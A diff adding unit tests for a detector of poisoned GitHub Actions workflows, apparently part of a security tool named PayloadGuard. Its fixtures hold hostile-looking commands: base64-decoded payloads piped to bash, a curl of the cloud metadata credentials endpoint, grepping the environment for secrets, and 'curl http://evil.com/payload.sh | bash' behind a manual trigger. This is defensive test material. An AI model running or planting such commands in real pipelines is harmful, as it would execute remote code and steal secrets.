@@ -1573,5 +1573,260 @@ class TestINC3UnverifiedFlag(unittest.TestCase):
             )
 
 
+# ==============================================================================
+# GITHUB ACTIONS POISONING DETECTION (Layer 2c)
+# ==============================================================================
+
+class TestGitHubActionsPoisoningScanning(unittest.TestCase):
+    """Tests for _scan_github_actions_poisoning — Layer 2c signal detection."""
+
+    def _build_workflow_diff(self, path, content, change_type="A"):
+        d = MagicMock()
+        d.change_type = change_type
+        d.b_path = path
+        d.a_path = path
+        d.b_blob.data_stream.read.return_value = content.encode()
+        return d
+
+    def _make_analyzer_with_diffs(self, diffs):
+        a = _make_analyzer()
+        t1 = datetime(2025, 1, 1, tzinfo=timezone.utc)
+        t2 = datetime(2025, 3, 1, tzinfo=timezone.utc)
+        branch_commit = MagicMock()
+        branch_commit.committed_datetime = t1
+        branch_commit.hexsha = "aabbccddeeff"
+        target_commit = MagicMock()
+        target_commit.committed_datetime = t2
+        target_commit.hexsha = "112233445566"
+        a.repo.commit.side_effect = lambda ref: target_commit if ref == "main" else branch_commit
+        a.repo.iter_commits.return_value = []
+        merge_base_commit = MagicMock()
+        merge_base_commit.diff.return_value = diffs
+        merge_base_commit.hexsha = "deadbeef00000000"
+        a.repo.merge_base.return_value = [merge_base_commit]
+        numstat_lines = []
+        for d in diffs:
+            path = getattr(d, 'b_path', None) or getattr(d, 'a_path', None) or 'file.yml'
+            numstat_lines.append(f"5\t0\t{path}")
+        a.repo.git.diff.return_value = "\n".join(numstat_lines)
+        return a
+
+    def test_clean_workflow_not_flagged(self):
+        content = (
+            "name: CI\non:\n  push:\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
+            "    steps:\n      - uses: actions/checkout@v4\n"
+        )
+        d = self._build_workflow_diff(".github/workflows/ci.yml", content)
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        self.assertNotIn("error", result)
+        self.assertEqual(result["actions_poisoning"]["total"], 0)
+
+    def test_base64_payload_detected(self):
+        content = (
+            "name: Deploy\non:\n  push:\njobs:\n  run:\n    runs-on: ubuntu-latest\n"
+            "    steps:\n      - run: echo cGF5bG9hZAo= | base64 -d | bash\n"
+        )
+        d = self._build_workflow_diff(".github/workflows/deploy.yml", content)
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        self.assertEqual(result["actions_poisoning"]["total"], 1)
+        sig_types = [s['type'] for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]]
+        self.assertIn("base64_payload", sig_types)
+
+    def test_base64_payload_severity_is_critical(self):
+        content = "run: echo dGVzdA== | base64 -d | bash\n"
+        d = self._build_workflow_diff(".github/workflows/evil.yml", content)
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        wf = result["actions_poisoning"]["flagged_workflows"][0]
+        self.assertEqual(wf["severity"], "CRITICAL")
+
+    def test_credential_harvest_metadata_endpoint(self):
+        content = "run: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
+        d = self._build_workflow_diff(".github/workflows/harvest.yml", content)
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        self.assertEqual(result["actions_poisoning"]["total"], 1)
+        sig_types = [s['type'] for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]]
+        self.assertIn("credential_harvest", sig_types)
+
+    def test_credential_harvest_env_grep(self):
+        content = "run: env | grep -i SECRET\n"
+        d = self._build_workflow_diff(".github/workflows/leak.yml", content)
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        sig_types = [s['type'] for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]]
+        self.assertIn("credential_harvest", sig_types)
+
+    def test_credential_harvest_severity_is_critical(self):
+        content = "run: curl http://169.254.169.254/\n"
+        d = self._build_workflow_diff(".github/workflows/c.yml", content)
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        wf = result["actions_poisoning"]["flagged_workflows"][0]
+        self.assertEqual(wf["severity"], "CRITICAL")
+
+    def test_dormant_trigger_with_shell_exec(self):
+        content = (
+            "on:\n  workflow_dispatch:\njobs:\n  run:\n    runs-on: ubuntu-latest\n"
+            "    steps:\n      - run: curl http://evil.com/payload.sh | bash\n"
+        )
+        d = self._build_workflow_diff(".github/workflows/sleeper.yml", content)
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        self.assertEqual(result["actions_poisoning"]["total"], 1)
+        sig_types = [s['type'] for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]]
+        self.assertIn("dormant_trigger_with_payload", sig_types)
+
+    def test_dormant_trigger_without_shell_is_safe(self):
+        content = (
+            "on:\n  workflow_dispatch:\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
+            "    steps:\n      - uses: actions/checkout@v4\n      - run: echo hello\n"
+        )
+        d = self._build_workflow_diff(".github/workflows/manual.yml", content)
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        if result["actions_poisoning"]["total"] > 0:
+            sig_types = [
+                s['type']
+                for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]
+            ]
+            self.assertNotIn("dormant_trigger_with_payload", sig_types)
+
+    def test_forged_bot_author_detected(self):
+        content = (
+            "steps:\n  - run: |\n"
+            "      git config user.name 'build-bot'\n"
+            "      git config user.email 'build-bot@example.com'\n"
+        )
+        d = self._build_workflow_diff(".github/workflows/forge.yml", content)
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        self.assertEqual(result["actions_poisoning"]["total"], 1)
+        sig_types = [s['type'] for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]]
+        self.assertIn("forged_bot_author", sig_types)
+
+    def test_forged_bot_author_severity_is_high(self):
+        content = "run: git config user.name auto-ci\n"
+        d = self._build_workflow_diff(".github/workflows/forge.yml", content)
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        wf = result["actions_poisoning"]["flagged_workflows"][0]
+        self.assertEqual(wf["severity"], "HIGH")
+
+    def test_oidc_elevation_without_consumer(self):
+        content = (
+            "permissions:\n  id-token: write\n  contents: read\n"
+            "steps:\n  - uses: actions/checkout@v4\n"
+        )
+        d = self._build_workflow_diff(".github/workflows/oidc.yml", content)
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        self.assertEqual(result["actions_poisoning"]["total"], 1)
+        sig_types = [s['type'] for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]]
+        self.assertIn("oidc_elevation_no_consumer", sig_types)
+
+    def test_oidc_elevation_with_legitimate_consumer_is_safe(self):
+        content = (
+            "permissions:\n  id-token: write\n  contents: read\n"
+            "steps:\n  - uses: aws-actions/configure-aws-credentials@v4\n"
+        )
+        d = self._build_workflow_diff(".github/workflows/aws.yml", content)
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        if result["actions_poisoning"]["total"] > 0:
+            sig_types = [
+                s['type']
+                for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]
+            ]
+            self.assertNotIn("oidc_elevation_no_consumer", sig_types)
+
+    def test_non_workflow_yaml_skipped(self):
+        content = "database_url: postgres://localhost/mydb\n"
+        d = self._build_workflow_diff("config/settings.yml", content)
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        self.assertEqual(result["actions_poisoning"]["total"], 0)
+
+    def test_modified_workflow_also_scanned(self):
+        content = "run: echo cGF5bG9hZA== | base64 -d | bash\n"
+        d = self._build_workflow_diff(".github/workflows/ci.yml", content, change_type="M")
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        self.assertEqual(result["actions_poisoning"]["total"], 1)
+
+    def test_decode_error_does_not_crash(self):
+        d = MagicMock()
+        d.change_type = "A"
+        d.b_path = ".github/workflows/bad.yml"
+        d.a_path = ".github/workflows/bad.yml"
+        d.b_blob.data_stream.read.side_effect = Exception("read error")
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        self.assertNotIn("error", result)
+        self.assertEqual(result["actions_poisoning"]["total"], 0)
+
+    def test_critical_signal_scores_destructive(self):
+        a = _make_analyzer()
+        v_without = a._assess_consequence(0, 0, 0, 0)
+        v_with = a._assess_consequence(
+            0, 0, 0, 0,
+            actions_poisoning_flags=1,
+            actions_poisoning_critical=True,
+        )
+        self.assertEqual(v_with["severity_score"] - v_without["severity_score"], 5)
+        self.assertEqual(v_with["status"], "DESTRUCTIVE")
+
+    def test_high_signal_scores_caution(self):
+        a = _make_analyzer()
+        v = a._assess_consequence(
+            0, 0, 0, 0,
+            actions_poisoning_flags=1,
+            actions_poisoning_critical=False,
+        )
+        self.assertEqual(v["severity_score"], 3)
+        self.assertEqual(v["status"], "CAUTION")
+
+    def test_actions_poisoning_key_in_report(self):
+        d = self._build_workflow_diff(
+            ".github/workflows/ci.yml",
+            "name: CI\non:\n  push:\njobs:\n  build:\n    runs-on: ubuntu-latest\n",
+        )
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        self.assertIn("actions_poisoning", result)
+        self.assertIn("total", result["actions_poisoning"])
+        self.assertIn("flagged_workflows", result["actions_poisoning"])
+
+    def test_actions_poisoning_disabled_via_config(self):
+        cfg = PayloadGuardConfig()
+        cfg.actions["enabled"] = False
+        a = _make_analyzer(config=cfg)
+        content = "run: echo cGF5bG9hZA== | base64 -d | bash\n"
+        d = self._build_workflow_diff(".github/workflows/evil.yml", content)
+        with patch.object(a, '_scan_github_actions_poisoning', wraps=a._scan_github_actions_poisoning):
+            result_flags = a._scan_github_actions_poisoning([d])
+        self.assertEqual(result_flags, [])
+
+    def test_flag_text_appears_in_verdict(self):
+        a = _make_analyzer()
+        v = a._assess_consequence(
+            0, 0, 0, 0,
+            actions_poisoning_flags=1,
+            actions_poisoning_critical=True,
+        )
+        self.assertTrue(any("GitHub Actions" in f for f in v["flags"]))
+
+    def test_deleted_workflow_not_scanned(self):
+        d = MagicMock()
+        d.change_type = "D"
+        d.a_path = ".github/workflows/ci.yml"
+        d.b_path = None
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        self.assertEqual(result["actions_poisoning"]["total"], 0)
+
+
 if __name__ == "__main__":
     unittest.main()
